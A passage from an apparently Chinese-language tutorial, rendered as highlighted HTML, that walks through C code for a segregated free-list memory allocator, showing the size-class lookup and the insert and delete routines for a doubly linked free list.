</span><span id=__span-170-31><a id=__codelineno-170-31 name=__codelineno-170-31></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>11</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-32><a id=__codelineno-170-32 name=__codelineno-170-32></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-33><a id=__codelineno-170-33 name=__codelineno-170-33></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>7</span><span class=p>;</span>
</span><span id=__span-170-34><a id=__codelineno-170-34 name=__codelineno-170-34></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-35><a id=__codelineno-170-35 name=__codelineno-170-35></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>12</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-36><a id=__codelineno-170-36 name=__codelineno-170-36></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-37><a id=__codelineno-170-37 name=__codelineno-170-37></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>8</span><span class=p>;</span>
</span><span id=__span-170-38><a id=__codelineno-170-38 name=__codelineno-170-38></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-39><a id=__codelineno-170-39 name=__codelineno-170-39></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>13</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-40><a id=__codelineno-170-40 name=__codelineno-170-40></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-41><a id=__codelineno-170-41 name=__codelineno-170-41></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>9</span><span class=p>;</span>
</span><span id=__span-170-42><a id=__codelineno-170-42 name=__codelineno-170-42></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-43><a id=__codelineno-170-43 name=__codelineno-170-43></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>14</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-44><a id=__codelineno-170-44 name=__codelineno-170-44></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-45><a id=__codelineno-170-45 name=__codelineno-170-45></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>10</span><span class=p>;</span>
</span><span id=__span-170-46><a id=__codelineno-170-46 name=__codelineno-170-46></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-47><a id=__codelineno-170-47 name=__codelineno-170-47></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>15</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-48><a id=__codelineno-170-48 name=__codelineno-170-48></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-49><a id=__codelineno-170-49 name=__codelineno-170-49></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>11</span><span class=p>;</span>
</span><span id=__span-170-50><a id=__codelineno-170-50 name=__codelineno-170-50></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-51><a id=__codelineno-170-51 name=__codelineno-170-51></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>16</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-52><a id=__codelineno-170-52 name=__codelineno-170-52></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-53><a id=__codelineno-170-53 name=__codelineno-170-53></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>12</span><span class=p>;</span>
</span><span id=__span-170-54><a id=__codelineno-170-54 name=__codelineno-170-54></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-55><a id=__codelineno-170-55 name=__codelineno-170-55></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>17</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-56><a id=__codelineno-170-56 name=__codelineno-170-56></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-57><a id=__codelineno-170-57 name=__codelineno-170-57></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>13</span><span class=p>;</span>
</span><span id=__span-170-58><a id=__codelineno-170-58 name=__codelineno-170-58></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-59><a id=__codelineno-170-59 name=__codelineno-170-59></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>18</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-60><a id=__codelineno-170-60 name=__codelineno-170-60></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-61><a id=__codelineno-170-61 name=__codelineno-170-61></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>14</span><span class=p>;</span>
</span><span id=__span-170-62><a id=__codelineno-170-62 name=__codelineno-170-62></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-63><a id=__codelineno-170-63 name=__codelineno-170-63></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>19</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-64><a id=__codelineno-170-64 name=__codelineno-170-64></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-65><a id=__codelineno-170-65 name=__codelineno-170-65></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>15</span><span class=p>;</span>
</span><span id=__span-170-66><a id=__codelineno-170-66 name=__codelineno-170-66></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-67><a id=__codelineno-170-67 name=__codelineno-170-67></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>20</span><span class=p>))</span><span class=w> </span>
</span><span id=__span-170-68><a id=__codelineno-170-68 name=__codelineno-170-68></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-69><a id=__codelineno-170-69 name=__codelineno-170-69></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>16</span><span class=p>;</span>
</span><span id=__span-170-70><a id=__codelineno-170-70 name=__codelineno-170-70></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-71><a id=__codelineno-170-71 name=__codelineno-170-71></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>21</span><span class=p>))</span>
</span><span id=__span-170-72><a id=__codelineno-170-72 name=__codelineno-170-72></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-73><a id=__codelineno-170-73 name=__codelineno-170-73></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>17</span><span class=p>;</span>
</span><span id=__span-170-74><a id=__codelineno-170-74 name=__codelineno-170-74></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-75><a id=__codelineno-170-75 name=__codelineno-170-75></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>22</span><span class=p>))</span>
</span><span id=__span-170-76><a id=__codelineno-170-76 name=__codelineno-170-76></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-77><a id=__codelineno-170-77 name=__codelineno-170-77></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>18</span><span class=p>;</span>
</span><span id=__span-170-78><a id=__codelineno-170-78 name=__codelineno-170-78></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-170-79><a id=__codelineno-170-79 name=__codelineno-170-79></a><span class=w>    </span><span class=k>else</span><span class=w> </span>
</span><span id=__span-170-80><a id=__codelineno-170-80 name=__codelineno-170-80></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-170-81><a id=__codelineno-170-81 name=__codelineno-170-81></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>19</span><span class=p>;</span>
</span><span id=__span-170-82><a id=__codelineno-170-82 name=__codelineno-170-82></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-170-83><a id=__codelineno-170-83 name=__codelineno-170-83></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>找到头结点后，就涉及到双向链表的插入和删除了，下面编写这两个函数：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-171-1> 1</a></span>
<span class=normal><a href=#__codelineno-171-2> 2</a></span>
<span class=normal><a href=#__codelineno-171-3> 3</a></span>
<span class=normal><a href=#__codelineno-171-4> 4</a></span>
<span class=normal><a href=#__codelineno-171-5> 5</a></span>
<span class=normal><a href=#__codelineno-171-6> 6</a></span>
<span class=normal><a href=#__codelineno-171-7> 7</a></span>
<span class=normal><a href=#__codelineno-171-8> 8</a></span>
<span class=normal><a href=#__codelineno-171-9> 9</a></span>
<span class=normal><a href=#__codelineno-171-10>10</a></span>
<span class=normal><a href=#__codelineno-171-11>11</a></span>
<span class=normal><a href=#__codelineno-171-12>12</a></span>
<span class=normal><a href=#__codelineno-171-13>13</a></span>
<span class=normal><a href=#__codelineno-171-14>14</a></span>
<span class=normal><a href=#__codelineno-171-15>15</a></span>
<span class=normal><a href=#__codelineno-171-16>16</a></span>
<span class=normal><a href=#__codelineno-171-17>17</a></span>
<span class=normal><a href=#__codelineno-171-18>18</a></span>
<span class=normal><a href=#__codelineno-171-19>19</a></span>
<span class=normal><a href=#__codelineno-171-20>20</a></span>
<span class=normal><a href=#__codelineno-171-21>21</a></span>
<span class=normal><a href=#__codelineno-171-22>22</a></span>
<span class=normal><a href=#__codelineno-171-23>23</a></span>
<span class=normal><a href=#__codelineno-171-24>24</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-171-1><a id=__codelineno-171-1 name=__codelineno-171-1></a><span class=cm>/*</span>
</span><span id=__span-171-2><a id=__codelineno-171-2 name=__codelineno-171-2></a><span class=cm>*  将空闲内存块插入到相应的空闲链表中</span>
</span><span id=__span-171-3><a id=__codelineno-171-3 name=__codelineno-171-3></a><span class=cm>*/</span>
</span><span id=__span-171-4><a id=__codelineno-171-4 name=__codelineno-171-4></a><span class=kt>void</span><span class=w> </span><span class=nf>insert</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>)</span>
</span><span id=__span-171-5><a id=__codelineno-171-5 name=__codelineno-171-5></a><span class=p>{</span>
</span><span id=__span-171-6><a id=__codelineno-171-6 name=__codelineno-171-6></a><span class=w>    </span><span class=cm>/* 块大小 */</span>
</span><span id=__span-171-7><a id=__codelineno-171-7 name=__codelineno-171-7></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-171-8><a id=__codelineno-171-8 name=__codelineno-171-8></a><span class=w>    </span><span class=cm>/* 根据块大小找到应该插入到哪个链表中 */</span>
</span><span id=__span-171-9><a id=__codelineno-171-9 name=__codelineno-171-9></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>num</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>search</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span><span id=__span-171-10><a id=__codelineno-171-10 name=__codelineno-171-10></a><span class=w>    </span><span class=cm>/* 空的，直接放 */</span>
</span><span id=__span-171-11><a id=__codelineno-171-11 name=__codelineno-171-11></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_HEAD</span><span class=p>(</span><span class=n>num</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-171-12><a id=__codelineno-171-12 name=__codelineno-171-12></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-171-13><a id=__codelineno-171-13 name=__codelineno-171-13></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=n>bp</span><span class=p>);</span><span class=w>  </span><span class=c1>// 更新链表头指针指向新块</span>
</span><span id=__span-171-14><a id=__codelineno-171-14 name=__codelineno-171-14></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>                     </span><span class=c1>// 前驱：设置新块的前驱指针为NULL</span>
</span><span id=__span-171-15><a id=__codelineno-171-15 name=__codelineno-171-15></a><span class=w>        </span><span class=n>PUT</span><span class=p>((</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>bp</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w> </span><span class=c1>// 后继：设置新块的后继指针为NULL</span>
</span><span id=__span-171-16><a id=__codelineno-171-16 name=__codelineno-171-16></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-171-17><a id=__codelineno-171-17 name=__codelineno-171-17></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=c1>// 链表不为空，则在链表头部插入新块(头插法)</span>
</span><span id=__span-171-18><a id=__codelineno-171-18 name=__codelineno-171-18></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-171-19><a id=__codelineno-171-19 name=__codelineno-171-19></a><span class=w>        </span><span class=n>PUT</span><span class=p>((</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>bp</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>GET_HEAD</span><span class=p>(</span><span class=n>num</span><span class=p>));</span><span class=w> </span><span class=c1>// 设置新块的后继指针指向当前链表的第一个节点</span>
</span><span id=__span-171-20><a id=__codelineno-171-20 name=__codelineno-171-20></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>GET_HEAD</span><span class=p>(</span><span class=n>num</span><span class=p>),</span><span class=w> </span><span class=n>bp</span><span class=p>);</span><span class=w>                     </span><span class=c1>// 设置原链表第一个节点的前驱指针指向新块  </span>
</span><span id=__span-171-21><a id=__codelineno-171-21 name=__codelineno-171-21></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>                              </span><span class=c1>// 前驱：设置新块的前驱指针为NULL</span>
</span><span id=__span-171-22><a id=__codelineno-171-22 name=__codelineno-171-22></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=n>bp</span><span class=p>);</span><span class=w>           </span><span class=c1>// 更新链表头指针指向新块</span>
</span><span id=__span-171-23><a id=__codelineno-171-23 name=__codelineno-171-23></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-171-24><a id=__codelineno-171-24 name=__codelineno-171-24></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>这个函数还是比较容易编写的，主要是要注意以下几点：</p> <ul> <li>插入块总是插入到链表头</li> <li>指针问题要细致考虑。比如：<code>heap_list + WSIZE * num</code>是对应大小类头结点在堆中的位置，而<code>GET_HEAD(num)</code>是大小类头结点存放的第一个块的地址</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-172-1> 1</a></span>
<span class=normal><a href=#__codelineno-172-2> 2</a></span>
<span class=normal><a href=#__codelineno-172-3> 3</a></span>
<span class=normal><a href=#__codelineno-172-4> 4</a></span>
<span class=normal><a href=#__codelineno-172-5> 5</a></span>
<span class=normal><a href=#__codelineno-172-6> 6</a></span>
<span class=normal><a href=#__codelineno-172-7> 7</a></span>
<span class=normal><a href=#__codelineno-172-8> 8</a></span>
<span class=normal><a href=#__codelineno-172-9> 9</a></span>
<span class=normal><a href=#__codelineno-172-10>10</a></span>
<span class=normal><a href=#__codelineno-172-11>11</a></span>
<span class=normal><a href=#__codelineno-172-12>12</a></span>
<span class=normal><a href=#__codelineno-172-13>13</a></span>
<span class=normal><a href=#__codelineno-172-14>14</a></span>
<span class=normal><a href=#__codelineno-172-15>15</a></span>
<span class=normal><a href=#__codelineno-172-16>16</a></span>
<span class=normal><a href=#__codelineno-172-17>17</a></span>
<span class=normal><a href=#__codelineno-172-18>18</a></span>
<span class=normal><a href=#__codelineno-172-19>19</a></span>
<span class=normal><a href=#__codelineno-172-20>20</a></span>
<span class=normal><a href=#__codelineno-172-21>21</a></span>
<span class=normal><a href=#__codelineno-172-22>22</a></span>
<span class=normal><a href=#__codelineno-172-23>23</a></span>
<span class=normal><a href=#__codelineno-172-24>24</a></span>
<span class=normal><a href=#__codelineno-172-25>25</a></span>
<span class=normal><a href=#__codelineno-172-26>26</a></span>
<span class=normal><a href=#__codelineno-172-27>27</a></span>
<span class=normal><a href=#__codelineno-172-28>28</a></span>
<span class=normal><a href=#__codelineno-172-29>29</a></span>
<span class=normal><a href=#__codelineno-172-30>30</a></span>
<span class=normal><a href=#__codelineno-172-31>31</a></span>
<span class=normal><a href=#__codelineno-172-32>32</a></span>
<span class=normal><a href=#__codelineno-172-33>33</a></span>
<span class=normal><a href=#__codelineno-172-34>34</a></span>
<span class=normal><a href=#__codelineno-172-35>35</a></span>
<span class=normal><a href=#__codelineno-172-36>36</a></span>
<span class=normal><a href=#__codelineno-172-37>37</a></span>
<span class=normal><a href=#__codelineno-172-38>38</a></span>
<span class=normal><a href=#__codelineno-172-39>39</a></span>
<span class=normal><a href=#__codelineno-172-40>40</a></span>
<span class=normal><a href=#__codelineno-172-41>41</a></span>
<span class=normal><a href=#__codelineno-172-42>42</a></span>
<span class=normal><a href=#__codelineno-172-43>43</a></span>
<span class=normal><a href=#__codelineno-172-44>44</a></span>
<span class=normal><a href=#__codelineno-172-45>45</a></span>
<span class=normal><a href=#__codelineno-172-46>46</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-172-1><a id=__codelineno-172-1 name=__codelineno-172-1></a><span class=cm>/*</span>
</span><span id=__span-172-2><a id=__codelineno-172-2 name=__codelineno-172-2></a><span class=cm>*  从空闲链表中删除指定的空闲内存块</span>
</span><span id=__span-172-3><a id=__codelineno-172-3 name=__codelineno-172-3></a><span class=cm>*/</span>
</span><span id=__span-172-4><a id=__codelineno-172-4 name=__codelineno-172-4></a><span class=kt>void</span><span class=w> </span><span class=nf>delete</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>)</span>
</span><span id=__span-172-5><a id=__codelineno-172-5 name=__codelineno-172-5></a><span class=p>{</span>
</span><span id=__span-172-6><a id=__codelineno-172-6 name=__codelineno-172-6></a><span class=w>    </span><span class=cm>/* 块大小 */</span>
</span><span id=__span-172-7><a id=__codelineno-172-7 name=__codelineno-172-7></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-172-8><a id=__codelineno-172-8 name=__codelineno-172-8></a><span class=w>    </span><span class=cm>/* 根据块大小找到头节点位置 */</span>
</span><span id=__span-172-9><a id=__codelineno-172-9 name=__codelineno-172-9></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>num</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>search</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span><span id=__span-172-10><a id=__codelineno-172-10 name=__codelineno-172-10></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-172-11><a id=__codelineno-172-11 name=__codelineno-172-11></a><span class=cm>    * 唯一节点, 后继为null, 前驱为null </span>
</span><span id=__span-172-12><a id=__codelineno-172-12 name=__codelineno-172-12></a><span class=cm>    * 头节点设为null</span>
</span><span id=__span-172-13><a id=__codelineno-172-13 name=__codelineno-172-13></a><span class=cm>    */</span>
</span><span id=__span-172-14><a id=__codelineno-172-14 name=__codelineno-172-14></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-172-15><a id=__codelineno-172-15 name=__codelineno-172-15></a><span class=w>    </span><span class=p>{</span><span class=w> </span>
</span><span id=__span-172-16><a id=__codelineno-172-16 name=__codelineno-172-16></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-172-17><a id=__codelineno-172-17 name=__codelineno-172-17></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-172-18><a id=__codelineno-172-18 name=__codelineno-172-18></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-172-19><a id=__codelineno-172-19 name=__codelineno-172-19></a><span class=cm>    * 最后一个节点 </span>
</span><span id=__span-172-20><a id=__codelineno-172-20 name=__codelineno-172-20></a><span class=cm>    * 将该块的前驱节点的后继指针设置为NULL</span>
</span><span id=__span-172-21><a id=__codelineno-172-21 name=__codelineno-172-21></a><span class=cm>    */</span>
</span><span id=__span-172-22><a id=__codelineno-172-22 name=__codelineno-172-22></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-172-23><a id=__codelineno-172-23 name=__codelineno-172-23></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-172-24><a id=__codelineno-172-24 name=__codelineno-172-24></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-172-25><a id=__codelineno-172-25 name=__codelineno-172-25></a><span class=w>    </span><span class=p>}</span><span class=w> </span>
</span><span id=__span-172-26><a id=__codelineno-172-26 name=__codelineno-172-26></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-172-27><a id=__codelineno-172-27 name=__codelineno-172-27></a><span class=cm>    * 第一个结点 </span>
</span><span id=__span-172-28><a id=__codelineno-172-28 name=__codelineno-172-28></a><span class=cm>    * 将链表头指针更新为指向被删除节点的后继节点</span>
</span><span id=__span-172-29><a id=__codelineno-172-29 name=__codelineno-172-29></a><span class=cm>    * 将新的链表第一个节点的前驱指针设置为NULL</span>
</span><span id=__span-172-30><a id=__codelineno-172-30 name=__codelineno-172-30></a><span class=cm>    */</span>
</span><span id=__span-172-31><a id=__codelineno-172-31 name=__codelineno-172-31></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
</span><span id=__span-172-32><a id=__codelineno-172-32 name=__codelineno-172-32></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-172-33><a id=__codelineno-172-33 name=__codelineno-172-33></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>heap_list</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>WSIZE</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-172-34><a id=__codelineno-172-34 name=__codelineno-172-34></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
</span><span id=__span-172-35><a id=__codelineno-172-35 name=__codelineno-172-35></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-172-36><a id=__codelineno-172-36 name=__codelineno-172-36></a><span class=w>    </span><span class=cm>/* </span>
</span><span id=__span-172-37><a id=__codelineno-172-37 name=__codelineno-172-37></a><span class=cm>    * 中间结点 </span>
</span><span id=__span-172-38><a id=__codelineno-172-38 name=__codelineno-172-38></a><span class=cm>    * 前驱的后继设为后继</span>
</span><span id=__span-172-39><a id=__codelineno-172-39 name=__codelineno-172-39></a><span class=cm>    * 后继的前驱设为前驱</span>
</span><span id=__span-172-40><a id=__codelineno-172-40 name=__codelineno-172-40></a><span class=cm>    */</span>
</span><span id=__span-172-41><a id=__codelineno-172-41 name=__codelineno-172-41></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-172-42><a id=__codelineno-172-42 name=__codelineno-172-42></a><span class=w>    </span><span class=p>{</span>
